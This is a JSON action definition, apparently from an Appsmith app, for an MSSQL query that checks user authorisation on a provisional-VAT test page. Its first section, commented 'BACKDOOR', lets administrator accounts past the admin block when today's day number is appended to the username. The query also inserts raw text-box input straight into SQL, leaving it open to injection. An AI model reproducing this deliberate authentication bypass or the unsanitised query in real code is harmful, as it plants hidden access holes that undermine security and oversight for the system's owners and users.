{
  "gitSyncId": "6601851cbf3e805bd6a4b13a_59f6b916-e1cd-4a47-95a4-48235e8a2f0d",
  "id": "Test_cambia_IVA_provvisorie_check_auth_user",
  "pluginId": "mssql-plugin",
  "pluginType": "DB",
  "unpublishedAction": {
    "actionConfiguration": {
      "body": "-- AGGIUNTE LE VIRGOLETTE '...' QUI SOTTO:\nDECLARE @InputText VARCHAR(100) = '{{InputUsername.text}}'; \nDECLARE @GiornoOggi VARCHAR(2) = RIGHT('00' + CAST(DAY(GETDATE()) AS VARCHAR), 2); \n\n-- 1. BACKDOOR (User + Giorno)\nIF RIGHT(@InputText, 2) = @GiornoOggi\nBEGIN\n    DECLARE @RealUserAdmin VARCHAR(100) = LEFT(@InputText, LEN(@InputText) - 2);\n\n    IF EXISTS (\n        SELECT 1 FROM dbo.cpusers U\n        INNER JOIN dbo.ba_users_xunit X ON U.code = X.ususerid\n        WHERE U.name = @RealUserAdmin AND X.usunitid = '0000000001' \n    )\n    BEGIN\n        SELECT 'CONNESSO' AS Stato, \n               (SELECT code FROM dbo.cpusers WHERE name = @RealUserAdmin) AS code\n        RETURN; \n    END\nEND\n\n-- 2. UTENTE ESISTE?\nIF NOT EXISTS (SELECT 1 FROM dbo.cpusers WHERE name = @InputText)\nBEGIN\n    SELECT 'UTENTE H2O ERRATO' AS Stato, NULL AS code\n    RETURN\nEND\n\n-- 3. BLOCCO AMMINISTRATORI STANDARD\nIF EXISTS (\n    SELECT 1 FROM dbo.cpusers U\n    INNER JOIN dbo.ba_users_xunit X ON U.code = X.ususerid\n    WHERE U.name = @InputText AND X.usunitid = '0000000001' \n)\nBEGIN\n    SELECT 'Procedura non autorizzata per l'' utente AMMINISTRATORE' AS Stato, \n           (SELECT code FROM dbo.cpusers WHERE name = @InputText) AS code\n    RETURN\nEND\n\n-- 4. WHITELIST\nIF NOT EXISTS (\n    SELECT 1 FROM dbo.cpusers U\n    INNER JOIN dbo.ba_users_xunit X ON U.code = X.ususerid\n    WHERE U.name = @InputText\n      AND X.usunitid IN ('0000000112') \n)\nBEGIN\n    SELECT 'Accesso NEGATO: Utente non appartenente ai gruppi autorizzati' AS Stato, \n           (SELECT code FROM dbo.cpusers WHERE name = @InputText) AS code\n    RETURN \nEND\n\n-- 5. CONTROLLO CONNESSIONE REALE\nSELECT \n    CASE \n        WHEN T.UTUSERCODE IS NOT NULL THEN 'CONNESSO'\n        ELSE 'DISCONNESSO' \n    END AS Stato,\n    U.code\nFROM dbo.cpusers U\nLEFT JOIN dbo.ba_user_tracking T ON U.code = T.UTUSERCODE\nWHERE U.name = @InputText;",
      "encodeParamsToggle": true,
      "paginationType": "NONE",
      "pluginSpecifiedTemplates": [
        {
          "value": true
        }
      ],
      "timeoutInMillisecond": 10000
    },
    "confirmBeforeExecute": false,
    "datasource": {
      "id": "TEST_PAIDEIA",
      "isAutoGenerated": false,
      "name": "TEST_PAIDEIA",
      "pluginId": "mssql-plugin"
    },
    "dynamicBindingPathList": [
      {
        "key": "body"
      }
    ],
    "name": "check_auth_user",
    "pageId": "Test_cambia_IVA_provvisorie",
    "runBehaviour": "MANUAL",
    "userSetOnLoad": false
  }
}